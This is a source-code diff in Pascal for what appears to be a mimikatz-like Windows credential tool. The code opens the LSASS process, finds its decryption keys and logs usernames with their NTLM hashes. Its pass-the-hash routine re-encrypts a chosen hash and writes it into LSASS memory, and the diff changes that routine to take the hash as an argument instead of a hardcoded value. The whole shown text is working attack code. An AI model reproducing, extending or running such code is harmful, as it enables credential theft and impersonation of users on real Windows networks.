@@ -533,7 +533,7 @@ begin
 end;
 
 //check kuhl_m_sekurlsa_utils.c
-function logonpasswords(pid:dword;module:string;luid:int64=0;func:pointer =nil):boolean;
+function logonpasswords(pid:dword;luid:int64=0;hash:string='';func:pointer =nil):boolean;
 const
   //dd Lsasrv!LogonSessionList in windbg
   PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
@@ -547,7 +547,7 @@ const
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
 var
-  //dummy:string;
+  module:string='lsasrv.dll';
   hprocess,hmod:thandle;
   hmods:array[0..1023] of thandle;
   MODINFO:  MODULEINFO;
@@ -792,9 +792,9 @@ begin
                                                           log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                                           log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
                                                           //below is only a test to see if we can re encrypt for PTH
-                                                          if luid<>0 then
+                                                          if (luid<>0) and (hash<>'') then
                                                           begin
-                                                          PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte('87DBA060EB4C302729C00E631A42E6CD');
+                                                          PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte(hash);
                                                           encryptLSA(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,decrypted,output);
                                                           writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),@output[0],PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length);
                                                           end;//if luid<>0 then
@@ -841,7 +841,7 @@ end;
 
 
 //check kuhl_m_sekurlsa_utils.c
-function wdigest(pid:dword;module:string):boolean;
+function wdigest(pid:dword):boolean;
 const
   //dd Lsasrv!LogonSessionList in windbg
   WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
@@ -859,6 +859,7 @@ const
   PTRN_WIN64_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0f, $39, $4e, $10);
   PTRN_WIN1809_PasswdSet_X86:array [0..6] of byte= ($74, $15, $8b, $17, $39, $56, $10);
 var
+  module:string='wdigest.dll';
   dummy:string;
   hprocess,hmod:thandle;
   hmods:array[0..1023] of thandle;
@@ -1121,7 +1122,7 @@ begin
   //cycle thru logonsessions to match the luid
   //patch the credentialblob to stuff the ntlm hash (encrypted with encryptlsa)
     findlsakeys (lsass_pid,deskey,aeskey,iv );
-    logonpasswords (lsass_pid ,'lsasrv.dll',stats.AuthenticationId);
+    logonpasswords (lsass_pid ,stats.AuthenticationId,''); //put your hash here
 //and finally resume...
     ResumeThread(pi.hThread );
     //_killproc(pi.dwProcessId); //temp
@@ -1251,13 +1252,13 @@ begin
   if p>0 then
      begin
      findlsakeys (lsass_pid,deskey,aeskey,iv );
-     logonpasswords (lsass_pid,'lsasrv.dll');
+     logonpasswords (lsass_pid);
      end;
   p:=pos('/wdigest',cmdline);
   if p>0 then
      begin
      if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
-        then wdigest (lsass_pid,'wdigest.dll')
+        then wdigest (lsass_pid)
         else log('findlsakeys failed',1);
      exit;
      end;
